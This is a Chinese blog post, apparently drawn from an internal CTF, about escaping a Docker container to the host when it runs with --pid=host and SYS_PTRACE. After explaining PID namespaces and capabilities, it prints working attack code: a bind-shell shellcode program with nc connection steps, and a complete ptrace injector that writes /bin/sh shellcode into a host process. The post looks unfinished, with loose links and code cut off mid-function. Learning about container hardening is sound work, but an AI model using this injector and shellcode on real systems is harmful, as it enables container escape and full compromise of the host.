---
title: 说好的隔离呢？Docker宿主机尽然被黑！
date: 2021-04-25 19:55:04
tags:
---

年初我和部门内的几个同事参加了公司内部的黑客CTF比赛。在比赛中，我学到了很多有意思的信息安全相关的知识。其中有些Docker容器相关的漏洞给我留下了深刻的印象。

今天，我和大家分享的一个漏洞就是由于启动容器时共享了宿主机的PID空间，再加上赋予了容器sys_ptrace capacitiy，从而导致黑客可以从容器环境黑掉宿主机。

# PID namespace

默认情况下，Docker容器都有自己的进程命名空间（PID namespace）。

在进程的命名空间里，容器是看不到内核系统进程和宿主机上的进程，而且容器里可以重复使用宿主机上的已经被用到的PID，所以容器里的进程可以有PID 1之类的进程ID。

但是在某些情况下，我们可能希望容器和宿主机共享进程空间。也就是说我们希望在容器里可以看到宿主机上运行的进程，这样我们就能在容器里用一些调试工具比如strace或gdb来调试宿主机上的进程。

所以，docker run提供了`--pid`选项。

比如，我们用默认选项启动一个Docker容器并运行ps命令，我们只能看到一个PID为1的进程，因为这个容器有他自己的的进程命名空间。

```bash
$ docker run -it --rm ubuntu ps -aef
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  6 10:33 pts/0    00:00:00 ps -aef
```

如果我们用`--pid=host`选项启动容器，那我们就能在容器里看到宿主机上的进程
```bash
docker run -it --pid=host --rm ubuntu  ps -aef
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  1 10:28 ?        00:00:08 /sbin/init splash
root         2     0  0 10:28 ?        00:00:00 [kthreadd]
root         3     2  0 10:28 ?        00:00:00 [rcu_gp]
root         4     2  0 10:28 ?        00:00:00 [rcu_par_gp]
...
root      3547  1129 24 10:37 pts/0    00:00:00 docker run -it --pid=host --rm u
root      3584     1  6 10:37 ?        00:00:00 /usr/bin/containerd-shim-runc-v2
root      3607  3584 14 10:37 pts/0    00:00:00 ps -aef
```

`--pid=host`打破了容器进程和宿主机进程间的壁垒，这就构成了该漏洞的第一个条件。

https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work

https://man7.org/linux/man-pages/man7/capabilities.7.html

https://blog.container-solutions.com/linux-capabilities-in-practice

# Linux capabilities

传统Unix系统进程权限管理方法，把进程分为privileged processes (whose effective user ID is 0, referred to
       as superuser or root), and unprivileged processes。简单说privileged processes拥有所有的超级权限，而普通进程则没有。

后来为了细粒度地管理这些超级权限，Linux系统把各种进程的特权划分为各种独立的capabilities。这样我们可以给进程他需要的部分特权，而不是要么都给要么一个都不给。

Docker运行容器的时候会默认给容器某些capability，我们也可以利用--cap-add and --cap-drop来增减给与容器的capability。

默认情况下，容器没有CAP_SYS_PTRACE capability。也就是说容器里是无法用ptrace系统调用来attach到一个进程来进行debug的。

```
strace -p 5202
strace: Could not attach to process. If your uid matches the uid of the target process, check the setting of /proc/sys/kernel/yama/ptrace_scope, or try again as the root user. For more details, see /etc/sysctl.d/10-ptrace.conf: Operation not permitted
strace: attach: ptrace(PTRACE_SEIZE, 5202): Operation not permitted
```

但是如果我们用·--cap-add=SYS_PTRACE· 赋予了容器这个capability后，容器里就可以用ptrace attach到进程上进行调试了。

如果我们同时用-pid=host来共享进程空间。那容器里就可以attach到宿主机的进程了。
`docker run -it --pid=host --cap-add=SYS_PTRACE --rm ubuntu`

bind shell

```
How To Run

$ gcc -o bind_shell bind_shell.c
$ execstack -s bind_shell
$ ./bind_shell

How to Connect

$ nc <HOST IP ADDRESS> 5600

Eg:

$ nc 127.0.0.1 5600

---------------------------------------------------------------------------------------------------
*/
#include <stdio.h>
char sh[]="\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05";
void main(int argc, char **argv)
{
	int (*func)();
	func = (int (*)()) sh;
	(int)(*func)();
}```




```/*
  Mem Inject
  Copyright (c) 2016 picoFlamingo
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>


#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include <sys/user.h>
#include <sys/reg.h>

#define SHELLCODE_SIZE 32

unsigned char *shellcode =
  "\x48\x31\xc0\x48\x89\xc2\x48\x89"
  "\xc6\x48\x8d\x3d\x04\x00\x00\x00"
  "\x04\x3b\x0f\x05\x2f\x62\x69\x6e"
  "\x2f\x73\x68\x00\xcc\x90\x90\x90";


int
inject_data (pid_t pid, unsigned char *src, void *dst, int len)
{
  int      i;
  uint32_t *s = (uint32_t *) src;
  uint32_t *d = (uint32_t *) dst;

  for (i = 0; i < len; i+=4, s++, d++)
    {
      if ((ptrace (PTRACE_POKETEXT, pid, d, *s)) < 0)
	{
	  perror ("ptrace(POKETEXT):");
	  return -1;
	}
    }
  return 0;
}

int
main (int argc, char *argv[])
{
  pid_t                   target;
  struct user_regs_struct regs;
  int                     syscall;
  long                    dst;

  if (argc != 2)
    {
      fprintf (stderr, "Usage:\n\t%s pid\n", argv[0]);
      exit (1);
    }
  target = atoi (argv[1]);
  printf ("+ Tracing process %d\n", target);

  if ((ptrace (PTRACE_ATTACH, target, NULL, NULL)) < 0)
    {
      perror ("ptrace(ATTACH):");
      exit (1);
    }

  printf ("+ Waiting for process...\n");
  wait (NULL);

  printf ("+ Getting Registers\n");
  if ((ptrace (PTRACE_GETREGS, target, NULL, &regs)) < 0)
    {
      perror ("ptrace(GETREGS):");
      exit (1);
    }


  /* Inject code into current RPI position */

  printf ("+ Injecting shell code at %p\n", (void*)regs.rip);
  inject_data (target, shellcode, (void*)regs.rip, SHELLCODE_SIZE);

  regs.rip += 2;
  printf ("+ Setting instruction pointer to %p\n", (void*)regs.rip);

  if ((ptrace (PTRACE_SETREGS, target, NULL, &regs)) < 0)
    {
      perror ("ptrace(GETREGS):");
      exit (1);
    }
  printf ("+ Run it!\n");


  if ((ptrace (PTRACE_DETACH, target, NULL, NULL)) < 0)
	{
	  perror ("ptrace(DETACH):");
	  exit (1);
	}
  return 0;
```


https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c